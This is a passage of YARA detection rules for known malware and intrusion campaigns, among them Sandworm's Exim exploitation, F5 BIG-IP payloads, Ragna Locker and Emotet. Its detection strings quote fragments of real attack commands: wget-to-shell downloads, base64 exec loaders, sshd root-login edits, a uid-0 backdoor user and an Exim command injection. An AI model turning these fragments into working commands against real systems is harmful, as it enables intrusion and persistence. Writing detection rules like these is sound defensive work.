      tags = "DEMO, SCRIPT, SUSP, T1027, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "${t`rue}" ascii nocase
      $ = "${tr`ue}" ascii nocase
      $ = "${tru`e}" ascii nocase
      $ = "${t`ru`e}" ascii nocase
      $ = "${tr`u`e}" ascii nocase
      $ = "${t`r`ue}" ascii nocase
      $ = "${t`r`u`e}" ascii nocase
   condition: 
      filesize < 6000KB and 1 of them
} 

rule APT_MAL_Ke3chang_Ketrican_Jun20_1_RID3280 : APT DEMO EXE FILE G0004 {
   meta:
      description = "Detects Ketrican malware"
      author = "Florian Roth"
      reference = "BfV Cyber-Brief Nr. 01/2020"
      date = "2020-06-18 14:07:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0004"
      minimum_yara = "1.7"
      
   strings:
      $xc1 = { 00 59 89 85 D4 FB FF FF 8B 85 D4 FB FF FF 89 45
               FC 68 E0 58 40 00 8F 45 FC E9 } 
      $op1 = { 6a 53 58 66 89 85 24 ff ff ff 6a 79 58 66 89 85 } 
      $op2 = { 8d 45 bc 50 53 53 6a 1c 8d 85 10 ff ff ff 50 ff } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) or 2 of them
} 

rule SUSP_Reversed_Hacktool_Author_RID3261 : DEMO HKTL SUSP T1136 {
   meta:
      description = "Detects a suspicious path traversal into a Windows folder"
      author = "Florian Roth"
      reference = "https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/"
      date = "2020-06-10 14:02:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, HKTL, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "iwiklitneg" fullword ascii wide
      $x2 = " eetbus@ " ascii wide
   condition: 
      filesize < 4000KB and 1 of them
} 

rule SUSP_Base64_Encoded_Hacktool_Dev_RID32C3 : DEMO HKTL SUSP T1132 T1136 {
   meta:
      description = "Detects a suspicious base64 encoded keyword"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1270626274826911744"
      date = "2020-06-10 14:19:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SUSP, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "QGdlbnRpbGtpd2" ascii wide
      $ = "BnZW50aWxraXdp" ascii wide
      $ = "AZ2VudGlsa2l3a" ascii wide
      $ = "QGhhcm1qMH" ascii wide
      $ = "BoYXJtajB5" ascii wide
      $ = "AaGFybWowe" ascii wide
      $ = "IEBzdWJ0ZW" ascii wide
      $ = "BAc3VidGVl" ascii wide
      $ = "gQHN1YnRlZ" ascii wide
   condition: 
      filesize < 6000KB and 1 of them
} 

rule MAL_Payload_F5_BIG_IP_Exploitations_Jul20_1_RID3665 : DEMO MAL T1105 T1136 {
   meta:
      description = "Detects code found in report on exploits against CVE-2020-5902 F5 BIG-IP vulnerability by NCC group"
      author = "Florian Roth"
      reference = "https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/"
      date = "2020-06-07 16:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "rm -f /etc/ld.so.preload" ascii fullword
      $x2 = "echo \"* * * * * $LDR" ascii
      $x3 = ".sh -o /tmp/in.sh" ascii
      $x4 = "chmod a+x /etc/.modules/.tmp" ascii
      $x5 = "chmod +x /var/log/F5-logcheck" 
      $s1 = "ulimit -n 65535" ascii fullword
      $s2 = "-s /usr/bin/wget " ascii
      $s3 = ".sh | sh" ascii
   condition: 
      filesize < 300KB and ( 1 of ( $x* ) or 3 of them )
} 

rule SUSP_Script_Base64_Blocks_Jun20_1_RID32AF : DEMO SUSP T1132 T1136 {
   meta:
      description = "Detects suspicious file with base64 encoded payload in blocks"
      author = "Florian Roth"
      reference = "https://posts.specterops.io/covenant-v0-5-eee0507b85ba"
      date = "2020-06-05 14:15:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $sa1 = "<script language=" ascii
      $sb2 = { 41 41 41 22 2B 0D 0A 22 41 41 41 } 
   condition: 
      all of them
} 

rule SUSP_Recon_Outputs_Jun20_1_RID3093 : DEMO SUSP T1136 {
   meta:
      description = "Detects outputs of many different commands often used for reconnaissance purposes"
      author = "Florian Roth"
      reference = "https://securelist.com/cycldek-bridging-the-air-gap/97157/"
      date = "2020-06-04 12:45:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ". . . . : Yes" ascii
      $s2 = "with 32 bytes of data:" ascii
      $s3 = "ff-ff-ff-ff-ff-ff     static" ascii
      $s4 = "  TCP    0.0.0.0:445" ascii
      $s5 = "System Idle Process" ascii
   condition: 
      filesize < 150KB and 4 of them
} 

rule APT_MAL_RU_Turla_Kazuar_May20_1_RID31E1 : APT DEMO EXE FILE G0010 RUSSIA T1136 {
   meta:
      description = "Detects Turla Kazuar malware"
      author = "Florian Roth"
      reference = "https://www.epicturla.com/blog/sysinturla"
      date = "2020-05-28 13:41:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0010, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Sysinternals" ascii fullword
      $s2 = "Test Copyright" wide fullword
      $op1 = { 0d 01 00 08 34 2e 38 30 2e 30 2e 30 00 00 13 01 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule APT_Sandworm_Keywords_May20_1_RID31CF : APT DEMO T1136 {
   meta:
      description = "Detects commands used by Sandworm group to exploit critical vulernability CVE-2019-10149 in Exim"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "MAIL FROM:<$(run(" 
      $x2 = "exec\\x20\\x2Fusr\\x2Fbin\\x2Fwget\\x20\\x2DO\\x20\\x2D\\x20http" 
   condition: 
      filesize < 8000KB and 1 of them
} 

rule APT_Sandworm_SSH_Key_May20_1_RID30ED : APT DEMO T1021 T1136 {
   meta:
      description = "Detects SSH key used by Sandworm on exploited machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2q/NGN/brzNfJiIp2zswtL33tr74pIAjMeWtXN1p5Hqp5fTp058U1EN4NmgmjX0KzNjjV" 
   condition: 
      filesize < 1000KB and 1 of them
} 

rule APT_Sandworm_SSHD_Config_Modification_May20_1_RID3793 : APT DEMO T1021 T1136 {
   meta:
      description = "Detects ssh config entry inserted by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 17:44:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "AllowUsers mysql_db" ascii
      $a1 = "ListenAddress" ascii fullword
   condition: 
      filesize < 10KB and all of them
} 

rule APT_Sandworm_InitFile_May20_1_RID318B : APT DEMO T1136 {
   meta:
      description = "Detects mysql init script used by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "GRANT ALL PRIVILEGES ON * . * TO 'mysqldb'@'localhost';" ascii
      $s2 = "CREATE USER 'mysqldb'@'localhost' IDENTIFIED BY '" ascii fullword
   condition: 
      filesize < 10KB and all of them
} 

rule APT_Sandworm_User_May20_1_RID3016 : APT DEMO T1136 {
   meta:
      description = "Detects user added by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 12:24:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mysql_db:x:" ascii
      $a1 = "root:x:" 
      $a2 = "daemon:x:" 
   condition: 
      filesize < 4KB and all of them
} 

rule APT_WEBSHELL_PHP_Sandworm_May20_1_RID3214 : APT DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects GIF header PHP webshell used by Sandworm on compromised machines"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 13:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "GIF89a <?php $" ascii
      $s1 = "str_replace(" ascii
   condition: 
      filesize < 10KB and $h1 at 0 and $s1
} 

rule APT_SH_Sandworm_Shell_Script_May20_1_RID343D : APT DEMO FILE T1136 T1160 {
   meta:
      description = "Detects shell script used by Sandworm in attack against Exim mail server"
      author = "Florian Roth"
      reference = "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
      date = "2020-05-28 15:22:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136, T1160"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "echo \"GRANT ALL PRIVILEGES ON * . * TO 'mysqldb'@'localhost';\" >> init-file.txt" ascii fullword
      $x2 = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version" ascii fullword
      $x3 = "sed -i -e '/PasswordAuthentication/s/no/yes/g; /PermitRootLogin/s/no/yes/g;" ascii fullword
      $x4 = "useradd -M -l -g root -G root -b /root -u 0 -o mysql_db" ascii fullword
      $s1 = "/ip.php?port=${PORT}\"" ascii fullword
      $s2 = "sed -i -e '/PasswordAuthentication" ascii fullword
      $s3 = "PATH_KEY=/root/.ssh/authorized_keys" ascii fullword
      $s4 = "CREATE USER" ascii fullword
      $s5 = "crontab -l | { cat; echo" ascii fullword
      $s6 = "mysqld --user=mysql --init-file=/etc/opt/init-file.txt --console" ascii fullword
      $s7 = "sshkey.php" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of ( $x* ) or 4 of them
} 

rule APT_RU_Sandworm_PY_May20_1_RID3026 : APT DEMO FILE RUSSIA T1136 {
   meta:
      description = "Detects Sandworm Python loader"
      author = "Florian Roth"
      reference = "https://twitter.com/billyleonard/status/1266054881225236482"
      date = "2020-05-28 12:27:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]" ascii fullword
      $s1 = "exec(o.open('http://" ascii
      $s2 = "__import__({2:'urllib2',3:'urllib.request'}" 
   condition: 
      uint16 ( 0 ) == 0x6d69 and filesize < 1KB and 1 of ( $x* ) or 2 of them
} 

rule APT_RU_Sandworm_PY_May20_2_RID3027 : APT DEMO FILE RUSSIA T1136 {
   meta:
      description = "Detects Sandworm Python loader"
      author = "Florian Roth"
      reference = "https://twitter.com/billyleonard/status/1266054881225236482"
      date = "2020-05-28 12:27:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "import sys;import re, subprocess;cmd" ascii fullword
      $x2 = "UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http" 
      $x3 = "';t='/admin/get.php';req" ascii
      $x4 = "ps -ef | grep Little\\ Snitch | grep " ascii fullword
   condition: 
      uint16 ( 0 ) == 0x6d69 and filesize < 2KB and 1 of them
} 

rule APT_LNX_Academic_Camp_May20_Eraser_1_RID33C6 : APT DEMO FILE LINUX {
   meta:
      description = "Detects malware used in attack on academic data centers"
      author = "Florian Roth"
      reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
      date = "2020-05-16 15:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "1.7"
      
   strings:
      $sc2 = { E6 FF FF 48 89 45 D0 8B 45 E0 BA 00 00 00 00 BE
               00 00 00 00 89 C7 E8 } 
      $sc3 = { E6 FF FF 89 45 DC 8B 45 DC 83 C0 01 48 98 BE 01
               00 00 00 48 89 C7 E8 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them
} 

rule APT_LNX_Academic_Camp_May20_Loader_1_RID33BB : APT DEMO FILE LINUX {
   meta:
      description = "Detects malware used in attack on academic data centers"
      author = "Florian Roth"
      reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
      date = "2020-05-16 15:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "1.7"
      
   strings:
      $sc1 = { C6 45 F1 00 C6 45 F2 0A C6 45 F3 0A C6 45 F4 4A 
               C6 45 F5 04 C6 45 F6 06 C6 45 F7 1B C6 45 F8 01 } 
      $sc2 = { 01 48 39 EB 75 EA 48 83 C4 08 5B 5D 41 5C 41 5D } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 10KB and all of them
} 

rule MAL_RANSOM_Ragna_Locker_Apr20_1_RID3195 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Ragna Locker Ransomware"
      author = "Florian Roth"
      reference = "https://otx.alienvault.com/indicator/file/c2bd70495630ed8279de0713a010e5e55f3da29323b59ef71401b12942ba52f6"
      date = "2020-04-27 13:28:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "---RAGNAR SECRET---" ascii
      $xc1 = { 0D 0A 25 73 0D 0A 0D 0A 25 73 0D 0A 25 73 0D 0A
               25 73 0D 0A 0D 0A 25 73 0D 0A 00 00 2E 00 72 00
               61 00 67 00 6E 00 61 00 72 00 5F } 
      $xc2 = { 00 2D 00 66 00 6F 00 72 00 63 00 65 00 00 00 00
               00 57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C
               00 44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00
               00 5C 00 6E 00 6F 00 74 00 65 00 70 00 61 00 64
               00 2E 00 65 00 78 00 65 00 } 
      $s1 = "bootfont.bin" wide fullword
      $sc2 = { 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 00
               00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 2E
               00 6F 00 6C 00 64 00 00 00 54 00 6F 00 72 00 20
               00 62 00 72 00 6F 00 77 00 73 00 65 00 72 00 } 
      $op1 = { c7 85 58 ff ff ff 55 00 6b 00 c7 85 5c ff ff ff } 
      $op2 = { 50 c7 85 7a ff ff ff 5c } 
      $op3 = { 8b 75 08 8a 84 0d 20 ff ff ff ff 45 08 32 06 8b } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 4 of them
} 

rule MAL_RANSOM_COVID19_Apr20_1_RID2ECC : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ransomware distributed in COVID-19 theme"
      author = "Florian Roth"
      reference = "https://unit42.paloaltonetworks.com/covid-19-themed-cyber-attacks-target-government-and-medical-organizations/"
      date = "2020-04-15 11:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/savekey.php" wide
      $op1 = { 3f ff ff ff ff ff 0b b4 } 
      $op2 = { 60 2e 2e 2e af 34 34 34 b8 34 34 34 b8 34 34 34 } 
      $op3 = { 1f 07 1a 37 85 05 05 36 83 05 05 36 83 05 05 34 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them
} 

rule APT_APT41_CN_ELF_Speculoos_Backdoor_RID3365 : APT CHINA DEMO FILE G0096 LINUX MAL T1136 {
   meta:
      description = "Detects Speculoos Backdoor used by APT41"
      author = "Florian Roth"
      reference = "https://unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/"
      date = "2020-04-14 14:46:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, FILE, G0096, LINUX, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $xc1 = { 2F 70 72 69 76 61 74 65 2F 76 61 72 00 68 77 2E
               70 68 79 73 6D 65 6D 00 68 77 2E 75 73 65 72 6D
               65 6D 00 4E 41 2D 4E 41 2D 4E 41 2D 4E 41 2D 4E
               41 2D 4E 41 00 6C 6F 30 00 00 00 00 25 30 32 78
               2D 25 30 32 78 2D 25 30 32 78 2D 25 30 32 78 2D
               25 30 32 78 2D 25 30 32 78 0A 00 72 00 4E 41 00
               75 6E 61 6D 65 20 2D 76 } 
      $s1 = "badshell" ascii fullword
      $s2 = "hw.physmem" ascii fullword
      $s3 = "uname -v" ascii fullword
      $s4 = "uname -s" ascii fullword
      $s5 = "machdep.tsc_freq" ascii fullword
      $s6 = "/usr/sbin/config.bak" ascii fullword
      $s7 = "enter MessageLoop..." ascii fullword
      $s8 = "exit StartCBProcess..." ascii fullword
      $sc1 = { 72 6D 20 2D 72 66 20 22 25 73 22 00 2F 70 72 6F
               63 2F } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 600KB and 1 of ( $x* ) or 4 of them
} 

rule SUSP_Reversed_Base64_Encoded_EXE_RID3291 : DEMO SUSP T1132 T1136 {
   meta:
      description = "Detects an base64 encoded executable with reversed characters"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-04-06 14:10:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, SUSP, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "AEAAAAEQATpVT" 
      $s2 = "AAAAAAAAAAoVT" 
      $s3 = "AEAAAAEAAAqVT" 
      $s4 = "AEAAAAIAAQpVT" 
      $s5 = "AEAAAAMAAQqVT" 
      $sh1 = "SZk9WbgM1TEBibpBib1JHIlJGI09mbuF2Yg0WYyd2byBHIzlGaU" ascii
      $sh2 = "LlR2btByUPREIulGIuVncgUmYgQ3bu5WYjBSbhJ3ZvJHcgMXaoR" ascii
      $sh3 = "uUGZv1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGV" ascii
   condition: 
      filesize < 10000KB and 1 of them
} 

rule APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A : APT DEMO FILE G0010 LINUX RUSSIA T1136 {
   meta:
      description = "Detects Penquin Turla Linux malware"
      author = "Florian Roth"
      reference = "https://twitter.com/IntezerLabs/status/1247131160452509696"
      date = "2020-04-05 14:12:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0010, LINUX, RUSSIA, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/root/.hsperfdata" ascii fullword
      $s2 = "Desc|     Filename     |  size  |state|" ascii fullword
      $s3 = "IPv6 address %s not supported" ascii fullword
      $s4 = "File already exist on remote filesystem !" ascii fullword
      $s5 = "/tmp/.sync.pid" ascii fullword
      $s6 = "'gateway' supported only on ethernet/FDDI/token ring/802.11/ATM LANE/Fibre Channel" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 5000KB and 4 of them
} 

rule MAL_Netsha_Mar20_1_RID2D1E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Netsha malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-03-24 10:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "the best. Fuck off all the rest." 
      $x2 = "Neshta 1.0 Made in Belarus. " ascii
      $op1 = { 85 c0 93 0f 85 62 ff ff ff 5e 5b 89 ec 5d c2 04 } 
      $op2 = { e8 e5 f1 ff ff 8b c3 e8 c6 ff ff ff 85 c0 75 0c } 
      $op3 = { eb 02 33 db 8b c3 5b c3 53 85 c0 74 15 ff 15 34 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $x* ) or 3 of them
} 

rule VUL_Tomcat_Catalina_CVE_2020_1938_RID31DF : DEMO EXPLOIT T1136 T1210 VULN {
   meta:
      description = "Detects a possibly active and vulnerable Tomcat configuration that includes an accessible and unprotected AJP connector (you can ignore backup files or files that are not actively used)"
      author = "Florian Roth"
      reference = "https://www.chaitin.cn/en/ghostcat"
      date = "2020-02-28 13:41:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1136, T1210, VULN"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "<?xml " 
      $a1 = "<Service name=\"Catalina\">" ascii
      $v1 = "<Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\"/>" ascii
      $fp1 = "<!--<Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\"" ascii
      $fp2 = " secret=\"" ascii
      $fp3 = " requiredSecret=\"" ascii
   condition: 
      $h1 at 0 and filesize <= 300KB and $a1 and $v1 and not 1 of ( $fp* )
} 

rule VUL_Exchange_CVE_2020_0688_RID2F1F : DEMO EXPLOIT T1136 VULN {
   meta:
      description = "Detects static validation key used by Exchange server in web.config"
      author = "Florian Roth"
      reference = "https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys"
      date = "2020-02-26 11:43:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1136, VULN"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "<?xml " 
      $x1 = "<machineKey validationKey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\"" ascii wide
   condition: 
      filesize <= 300KB and $h1 at 0 and $x1
} 

rule MAL_Netsha_Feb20_1_RID2D0B : DEMO EXE FILE MAL {
   meta:
      description = "Detects Netsha malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2020-02-24 10:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { e8 3c 2a ff ff b8 ff ff ff 7f eb 3e 83 7d 0c 00 } 
      $op2 = { 2b c7 50 e8 a4 40 ff ff ff b6 88 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize >= 3000KB and filesize <= 8000KB and all of them
} 

rule MAL_Emotet_Jan20_1_RID2D22 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Emotet malware"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/5e81638e-df2e-4a5b-9e45-b07c38d53929/"
      date = "2020-01-29 10:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $op0 = { 74 60 8d 34 18 eb 54 03 c3 50 ff 15 18 08 41 00 } 
      $op1 = { 03 fe 66 39 07 0f 85 2a ff ff ff 8b 4d f0 6a 20 } 
      $op2 = { 8b 7d fc 0f 85 49 ff ff ff 85 db 0f 84 d1 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 200KB and ( pe.imphash ( ) == "009889c73bd2e55113bf6dfa5f395e0d" or 1 of them )
} 

rule SUSP_BAT_Aux_Jan20_1_RID2D89 : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects BAT file often dropped to cleanup temp dirs during infection"
      author = "Florian Roth"
      reference = "https://medium.com/@quoscient/the-chicken-keeps-laying-new-eggs-uncovering-new-gc-maas-tools-used-by-top-tier-threat-actors-531d80a6b4e9"
      date = "2020-01-29 10:36:01"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if exist \"C:\\Users\\" ascii
      $s2 = "\\AppData\\Local\\Temp\\" ascii
      $s3 = "del \"C:\\Users\\" ascii
      $s4 = ".bat\"" ascii
      $s5 = ".exe\" goto" ascii
   condition: 
      uint8 ( 0 ) == 0x3a and filesize <= 1KB and all of them
} 

rule SUSP_PS1_FromBase64String_Content_Indicator_RID3714 : DEMO SUSP T1086 T1132 T1136 {
   meta:
      description = "Detects suspicious base64 encoded PowerShell expressions"
      author = "Florian Roth"
      reference = "https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639"
      date = "2020-01-25 17:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, SUSP, T1086, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "::FromBase64String(\"H4s" ascii wide
      $ = "::FromBase64String(\"TVq" ascii wide
      $ = "::FromBase64String(\"UEs" ascii wide
      $ = "::FromBase64String(\"JAB" ascii wide
      $ = "::FromBase64String(\"SUVY" ascii wide
      $ = "::FromBase64String(\"SQBFAF" ascii wide
      $ = "::FromBase64String(\"SQBuAH" ascii wide
      $ = "::FromBase64String(\"PAA" ascii wide
      $ = "::FromBase64String(\"cwBhA" ascii wide
      $ = "::FromBase64String(\"aWV4" ascii wide
      $ = "::FromBase64String(\"aQBlA" ascii wide
      $ = "::FromBase64String(\"R2V0" ascii wide
      $ = "::FromBase64String(\"dmFy" ascii wide
      $ = "::FromBase64String(\"dgBhA" ascii wide
      $ = "::FromBase64String(\"dXNpbm" ascii wide
      $ = "::FromBase64String(\"H4sIA" ascii wide
      $ = "::FromBase64String(\"Y21k" ascii wide
      $ = "::FromBase64String(\"Qzpc" ascii wide
      $ = "::FromBase64String(\"Yzpc" ascii wide
      $ = "::FromBase64String(\"IAB" ascii wide
      $ = "::FromBase64String('H4s" ascii wide
      $ = "::FromBase64String('TVq" ascii wide
      $ = "::FromBase64String('UEs" ascii wide
      $ = "::FromBase64String('JAB" ascii wide
      $ = "::FromBase64String('SUVY" ascii wide
      $ = "::FromBase64String('SQBFAF" ascii wide
      $ = "::FromBase64String('SQBuAH" ascii wide
      $ = "::FromBase64String('PAA" ascii wide
      $ = "::FromBase64String('cwBhA" ascii wide
      $ = "::FromBase64String('aWV4" ascii wide
      $ = "::FromBase64String('aQBlA" ascii wide
      $ = "::FromBase64String('R2V0" ascii wide
      $ = "::FromBase64String('dmFy" ascii wide
      $ = "::FromBase64String('dgBhA" ascii wide
